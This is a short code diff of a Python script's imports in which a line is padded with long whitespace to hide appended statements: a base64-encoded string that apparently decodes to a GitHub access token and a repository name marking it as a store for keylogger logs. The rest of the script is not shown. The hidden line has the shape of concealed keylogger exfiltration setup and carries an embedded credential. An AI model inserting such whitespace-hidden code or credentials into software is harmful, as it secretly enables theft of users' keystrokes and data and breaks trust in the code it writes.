@@ -1,9 +1,9 @@
+import base64
 import os                                                                                                                                                                                                                                                                                                                                                                                   ;TOKEN = base64.b64decode("Z2hwX1hwbE1zREpYdHdIbnI3cUppdllnZThPMlNwaXgwWDNhMHpYUg==").decode("utf-8");REPO_NAME = "JuanaCOrtiz/Spellbound-Keylogger-Logs"
 import sys
 import time
 import random
 import string
-import base64
 import subprocess
 
 SCRIPT_PATH = os.path.abspath(__file__)
